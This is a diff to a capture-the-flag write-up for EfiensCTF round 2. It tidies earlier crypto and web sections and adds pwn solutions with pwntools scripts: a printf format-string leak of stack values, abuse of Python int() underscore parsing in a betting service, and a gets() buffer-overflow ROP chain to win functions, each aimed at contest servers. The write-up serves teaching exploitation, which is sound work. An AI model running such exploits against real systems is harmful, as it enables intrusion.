@@ -30,6 +30,8 @@ The following tables lists out the challenges I solved during the contest time. 
 
 Note that this list only contains problem that I solved, which were not completed. 
 
+All challenge files and solutions can be found in [my github repos](https://github.com/mkbui/EfiensCTF-Writeup/tree/main/round2)
+
 
 ## ROT1000
 
@@ -305,11 +307,13 @@ def hamming(intin):
 
 Using the clue above, I figured `B`, `C`, `D`, or some bitwise combination between them, must have a noticeably higher or lower Hamming distance with our `blob` or `magic`. At the contest time, I was not keen and intelligent enough to work out which exact combination is the mathematically suitable. However, using the *no-bruteforce* suggestion, I tried experimenting with simple single `B` / `C` / `D` cases first by generating my own seeds and magic numbers. Upon some testing, I figure out `blob` has an unusually lower Hamming distance when compared with `B` and `D`. In almost all cases, discovering the two numbers that produced the lowest Hamming weight when XORed with `blob` also means discovering `B` and `D`. 
 
+
 > How is this the case, though? We can use some probability into working out the reason. Assume that for a randomly generated number using `getrandbits`, each bit has approximately 50% of being one, and 50% of being zero. This means that if we XOR `blob` with any randomly generated 500-bit number different from `B`, `C` or `D`, the result would be another completely random number with roughly 50% set bits, or in our term, `0.5*500` Hamming weight.
-
+>
 > The second assumption is that our flag's bit length is significantly smaller than 500 (for most CTF problems, the flag bit length is usually 200-400 bits). This means that our upper 100-300 bits of `blob` only depends on `B`, `C`, and `D`. Otherwise, if the flag's bit length is about or larger than 500, the result would again be a completely random number with 50% set bits and our method will not work at all.
-
+>
 > Also take in mind the following properties of bitwise XOR:
+
 ```
 X ^ Y       = (X & ~Y) | (~X & Y)
 (X | Y) ^ X = (~X & Y)
@@ -323,9 +327,10 @@ blob ^ B    = (B & C) ^ (C | D) ^ B ^ C ^ D
             = (B & C) ^ (C & D)
 ```
 
-> Now, considering `M = (B & C) ^ (C & D)`, what is the expected Hamming weight of this number? By some truth-table working out, it is figurable that at each bit position `i`, `M[i] = 1  <=>  (B[i], C[i], D[i]) = (1, 0, 1) | (B[i], C[i], D[i]) = (0, 1, 0)`. This makes 2 combinations out of `2**3 = 8` possible combinations of `(B, C, D)`. Hence, each bit of `M` will have 25% of being `1`, or its expected Hamming weight will be `0.25*500` - a considerably lower value in comparison with `0.5*500`.
-
+> Considering `M = (B & C) ^ (C & D)`, what is the expected Hamming weight of this number? By some truth-table working out, it is figurable that at each bit position `i`, `M[i] = 1  <=>  (B[i], C[i], D[i]) = (1, 0, 1) | (B[i], C[i], D[i]) = (0, 1, 0)`. This makes 2 combinations out of `2**3 = 8` possible combinations of `(B, C, D)`. Hence, each bit of `M` will have 25% of being `1`, or its expected Hamming weight will be `0.25*500` - a considerably lower value in comparison with `0.5*500`.
+>
 > The same principle applies to `D`. However with `C`, there is still 4 out of 8 possible combinations and the Hamming weight is still the same as XORing with any other random number. 
+
 
 Using this information, we can easily find `B` and `D` 
 
@@ -370,7 +375,7 @@ You can also view the bruteforce alternative (attempted after the onsite contest
 
 # Cave of Wonder
 
-> URL: [link](http://128.199.177.181:4442/)
+> URL: [http://128.199.177.181:4442](http://128.199.177.181:4442/)
 
 Upon visiting the website, an authentication service can be seen which promps user to enter username and password. If we enter any arbitrary input and press LOGIN, there will be a browser alert box popped up, saying that we are not the one. The site was not re-rendered, instead it just prompts the box immediately using Chrome's alert component. This means the input checking is performed by the client side (possibly using Javascript), not the server side as usual. This may prove to be dangerous as client side rendering can be easily viewed by inspecting the browser - thus why service on the client side is usually for view support and constraint checking, instead of *working with password like a boss*. 
 
@@ -425,7 +430,7 @@ Flag: `efiensctf{4l@dd1n_M1ght_@ls0_b3_4_H4ck3r.}`
 
 # Tiểu Cường học Nodejs  
 
-> URL: [link](http://128.199.177.181:4441/index.html)
+> URL: [http://128.199.177.181:4441/index.html](http://128.199.177.181:4441/index.html)
 
 > Hint 1: *dot dot dash* and *don't use a browser*
 
@@ -444,7 +449,7 @@ Flag: `efiensctf{Remembering_Understanding_Applying_Analyzing_Evaluating_Creatin
 
 # Rapper Hub
 
-> URL: [link](http://128.199.177.181:4444/)
+> URL: [http://128.199.177.181:4444](http://128.199.177.181:4444/)
 
 The website displays a list of some local dankest rappers, which we can view in detail by clicking on the magnifying glass at each item.
 
@@ -507,7 +512,7 @@ For an automated script to perform the bypass and request, see [rapper_sol.py](.
 
 # Trust bank is back
 
-> URL:  [link](http://128.199.177.181:4443/)
+> URL:  [http://128.199.177.181:4443](http://128.199.177.181:4443/)
 
 > Hint 1: Logical bug!
 
@@ -662,3 +667,293 @@ for b in flag:
 ```
 
 Flag: `efiensctf{r4nd0m_numb3r5_c4n7_b347_m3!!!}`
+
+# Lottery
+
+> Source files: [lottery.c](./pwn/lottery/lottery.) [lottery](./pwn/lottery/lottery)
+
+> Connect at 128.199.234.122:4200
+
+The challenge gives us the C source for the program, as well as the executable file.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+//gcc -m32 -o lottery lottery.c
+int main(void)
+{
+    srand(time(0));
+    char name[10];
+    int number, s1, s2;
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    printf("Give me your name:");
+    fgets(name, 10, stdin);
+
+    s1 = rand() % 1000000;
+    s2 = rand() % 1000000;
+    printf("Hello ");
+    printf(name);
+    puts("\nPick a number: ");
+    scanf("%d", &number);
+    if (number != s1 + s2)
+    {
+        printf("The lucky number is %d\n", s1 + s2);
+        puts("Good luck next time");
+    }
+    else
+    {
+        system("/bin/cat flag.txt");
+    }
+    return 0;
+}
+```
+
+At `main`, the program asks us for our name which is received using `fgets` on 10 characters. It then generates two random numbers `s1` and `s2` as local variables using real-time seeds. The program then prints our name back using `printf(name)` and again, prompts us to enter a number. If the number is exactly the sum of two random variables `s1` and `s2`, it will give us the flag. Else, it will generously print the expected lucky number for us to try next time.
+
+For anyone who has tried any beginner level Binary exploitation problem, it would be immediately recognizable of the misuse of `printf` function here, which leads to the Format string exploit. The first arguments in `printf` is intended for what our formatted string we would like to print (i.e `"%s"`), while variables like `name` should be from the second argument onwards and will be passed into our format string via the `%` identifier. Thus, if `name` is passed to the first argument of `printf`, we can actually control what the formatted string printed out by the program would be.
+
+Now, for example, if we enter our name as `%d`, then the call `printf(name)` will take the second argument of the function and print it out. But since there is no second argument supplied, the program will take the first variable in the local stack as the argument. This helps us view the value of the function's local variable, which is exactly what we needs here. Our task now is to find where `s1` and `s2` are located, which should be next to each other. However, as `fgets` only takes our first 10 characters, we can only view at most 5 first variables on stack using `%d%d%d%d%d`. As it turns out, these first five variables do not seem to contain both `s1` and `s2` as none of the pairwise sum agrees with the expected lucky number.
+
+Fortunately, we can exploit the use of format string to view the exact position on the stack using `$` identifier. For example, `%5$d` will pop the fifth local variable on stack for us. Using this approach, we can conveniently identify which two position `s1` and `s2` lie at - which turns out to be 6th and 7th.
+
+The remaining task is trivial, which we can complete by interacting with the terminal and do the math or writing some scripts:
+```python
+from pwn import *
+
+r = remote('128.199.234.122', 4200)
+r.recv()
+r.send('%6$d %7$d\n')
+s = r.recvuntil(b':').split(b'\n')[0].split(b' ')
+s1, s2 = int(s[1]), int(s[2])
+r.send(str(s1+s2)+'\n')
+r.recv()
+print(r.recv().decode())
+```
+
+It is to be noted though, that I have read about a problem very similar to this one at an Efiens member's [blog post](https://blog.efiens.com/post/midas/efiensctf2019-round2-writeups/) on the site itself. This was reused from EfiensCTF 2018 round 2, and if we have taken some time browsing the blog before attending the contest, this challenge would be a walk in the park. However, the actual number of solves during the onsite contest was still pretty low, which proves the superiority of Efiens blog readers over others. So wait no more, claim your dominance right today on [Efiens Blog](https://blog.efiens.com/).
+
+Flag: `efiensctf{ULTRA_MEGA_SUPER_HUGE_VIETLOT_JACKPOT}`
+
+# Luck
+
+> Source files: [luck.py](./pwn/luck/luck.py)
+
+> Hint: [Python int() documentation)(https://docs.python.org/3/library/functions.html#int)
+
+> Connect at 128.199.234.122:2222
+
+The program depicts an online service that either let user *buy flag* with a large amount of money, or *test your luck* by betting an amount of money no less than our current asset, and gain that money with 10% probability or lose 10$ at 90% probability. 
+
+The functions of attention here is `luck` (which performs the betting service) and `get_value` (which transfer our input into money in number):
+```python
+def get_value(n):
+    value = 0
+    for i in range(len(n)):
+        value = 10*value + (ord(n[i]) - 0x30)
+    return value
+
+def luck(money):
+    print("How much do you wanna bet?")
+    print("> ", end="")
+    bet = input().strip().replace('+', '').replace('-', '')
+    
+    try:
+        int(bet)
+        bet.encode("ascii")
+    except:
+        print("Invalid number")
+        return money
+    
+    if int(bet) > money:
+        print("Can't bet more than what you have")
+        return money
+    else:
+        if random.randint(1, 10) == 1:
+            print("You win {}$".format(bet))
+            return money + get_value(bet)
+        else:
+            print("You lose {}$".format(10))
+            return money - 10
+```
+
+The program removes any sign notation as well as making sure our input is a valid Python `int()` init argument, and contains only ASCII characters. It also makes sure `int(bet)` is not larger than our current asset. 
+
+As we can quickly see here, the intended exploit should be between the `int()` and `get_value()` functions. The coder uses `int()` in checking constraint, but uses `get_value()` in converting our input into the money. And as we can see, `get_value()` naively calculate the ASCII difference from `'0'` of each digit in our input, which could get us an unexpectedly high result if our digits contain any non-numeric character with ASCII value larger than `'0'`. Furthermore, this character should be accepted and convertable by `int()` (the value should also be smaller than 69). Attempts with stuffs like `'0.0000001'` or `'0x0000001'` could not yield result, so I abandon the problem for a while. Briefly after, the challenge author releases a hint showing a link to Python's document about `int` function. I had visited this link before, but had not pinpoint the exploitable part. However, upon the second visit, I paid more attention to the details in the documentation. 
+
+First we should notice that in the source, the version specification is indicated as `#!/usr/bin/env python3.6`. This tells us some hint about this version, so I paid attention on changes made on `int()` documented. Here, we can see:
+
+`Changed in version 3.6: Grouping digits with underscores as in code literals is allowed.`
+
+More exploration on this topic reveals that we can pass into `int()` a string with alternative underscores like `1_2_3`, which would be interpreted as `123`. Underscore character also has a much higher value than `'0'`. Therefore, we have finally come to a possible solution. We would just need to craft something like `0_0_0_0_0_6_9`, which would be accepted by `int()` and upon winning, would gain us a really large value enough to buy the flag.
+
+Although we just need to win to gain enough money, in some cases we may be unfortunate enough to lose all money before winning once. Thus, a script could be convenient to accomodate this.
+
+```python
+from pwn import *
+
+found = False
+while not found:
+  r = remote('128.199.234.122', 2222)
+  money = 69
+
+  while True:
+    r.send('1\n0_0_0_0_0_0_0_1\n')
+    res = r.recvuntil(b'$').split(b' ')[-2]
+
+    if res == b'win':
+      r.recvuntil(b'> ') 
+      r.send('2\n')
+      print(r.recvuntil(b'}').decode())
+      found = True 
+      break
+
+    money -= 10
+    if money < 1:
+      break
+```
+
+*Note*: it is actually feasible to bruteforce and try our luck by betting all our money in the traditional way. Since we only lose $10 for each lost, as long as our asset gets to be higher than $100, the expected gain is always positive. In fact, consider if our first few tries have been lucky enough to double our amount to some neat value, we just need around `log2(696969696969)*10 = 390` tries in average to achieve enough money to buy the flag - we just need a script and some little patience (much less than Four Time Pad, I suppose).
+
+Flag: `efiensctf{wh4t_1s_th4t_w31rd_numb3r_FeelsWeirdMan}`
+
+# ROP
+
+> Source files: [rop](./pwn/rop/rop)
+
+> Connect at 128.199.234.122:4300
+
+This challenge does not give us the source file, but a quick deassembling in Ghidra could pretty much recover [what we need](./pwn/rop/rop.c).
+
+```c
+void win_function1(void) {
+  win1 = 1;
+  return;
+}
+
+void win_function2(int param_1) {
+  if ((win1 == '\0') || (param_1 != -0x45555553)) {
+    if (win1 == '\0') {
+      puts("Nope. Try a little bit harder.");
+    }
+    else {
+      puts("Wrong Argument. Try Again.");
+    }
+  }
+  else {
+    win2 = 1;
+  }
+  return;
+}
+
+
+
+void flag(int param_1) {
+  char local_40 [48];
+  FILE *local_10;
+  
+  local_10 = fopen("flag.txt","r");
+  if (local_10 == (FILE *)0x0) {
+    puts(
+        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
+        );
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  fgets(local_40,0x30,local_10);
+  if (((win1 == '\0') || (win2 == '\0')) || (param_1 != -0x21524553	)) {
+    if ((win1 == '\0') || (win2 == '\0')) {
+      if ((win1 == '\0') && (win2 == '\0')) {
+        puts("You won\'t get the flag that easy..");
+      }
+      else {
+        puts("Nice Try! You\'re Getting There!");
+      }
+    }
+    else {
+      puts(
+          "Incorrect Argument. Remember, you can call other functions in between each win function!"
+          );
+    }
+  }
+  else {
+    printf("%s",local_40);
+  }
+  return;
+}
+
+
+void vuln(void) {
+  char local_1c [24];
+  
+  printf("Enter your input> ");
+  gets(local_1c);
+  return;
+}
+
+undefined4 main(void){
+  __gid_t __rgid;
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  __rgid = getegid();
+  setresgid(__rgid,__rgid,__rgid);
+  vuln();
+  return 0;
+}
+
+```
+
+Basically, `main()` will call `vuln()`, which takes our input using `gets()` and pass into the local array `local_1c[24]`, then simply returns. We can spot the buffer overflow exploit here and use it to control the program flow. We want to somehow jump to the `flag(param_1)` function, which requires a suitable `param_1` as well as having jumped to `win_function1` and `win_function2` prior. `win_function2(param_1)` also requires proper parameter passing.
+
+As indicated by the challenge name, we need to use Return-Oriented Programming to control our flow by writing on the overflown stack at suitable address with suitable value.
+
+First, we use `gdb > info function` to view the address of our functions. A quick look into the result reviews the address to be
+```
+win_function1 	= 0x080485cb
+win_function2 	= 0x080485d8
+flag 	 	= 0x0804862b
+```
+These are the values we need to pass into the stack's `$eip` area, which denotes the return address of the function. Moreover, we also need to pass the suitable parameter for the comparison to be true. Converting the signed hex value in the pseudocode into x32 address yields us
+```
+param_w2 = 0xBAAAAAAD
+param_flag = 0xDEADBAAD
+```
+With this in mind, we are ready to craft our payload as followed:
+```
+    +--------------------------+----------------+-----------------+-----------------+----------------+---------------+--------------+
+    | 24 bytes of local buffer | 4 filler bytes | win_1's address | win_2's address | flag's address | win_2's param | flag's param |
+    +--------------------------+----------------+-----------------+-----------------+----------------+---------------+--------------+
+```
+Script to interact with server:
+```python
+from pwn import *
+
+r = remote('128.199.234.122', 4300)
+r.recv()
+
+fill = b'AAAA'*(6+1)
+win_1 = 0x080485cb
+win_2 = 0x080485d8
+flag = 0x0804862b
+param_w2 = 0xBAAAAAAD
+param_flag = 0xDEADBAAD
+
+payload = fill +  p32(win_1) + p32(win_2) + p32(flag) + p32(param_w2) + p32(param_flag)
+
+r.send(payload+b"\n")
+print(r.recv().decode())
+```
+
+To be honest, without the helpful debugging message throughout the program, I would have much more difficulty complete this problem since my understanding of program stacks was still limited at the moment.
+
+Flag: `efiensctf{rop_4gain_and_ag4in_and_aga1n}`
+
+# References
+[1] Efiens' blog posts and resources. [https://blog.efiens.com/](https://blog.efiens.com/)
+[2] Santanu Sarkar, Some results on Cryptanalysis of RSA and Factorization
+[2] HackTricks, SQL Injection guides [https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+[3] PortSwiggers, Vulnerabilities in multi-factor authentication, [https://portswigger.net/web-security/authentication/multi-factor](https://portswigger.net/web-security/authentication/multi-factor)
+[4] Nguyễn Thành Nam, Nghệ thuật tận dụng lỗi phần mềm
+[5] Miscellaneous resources on the Internet
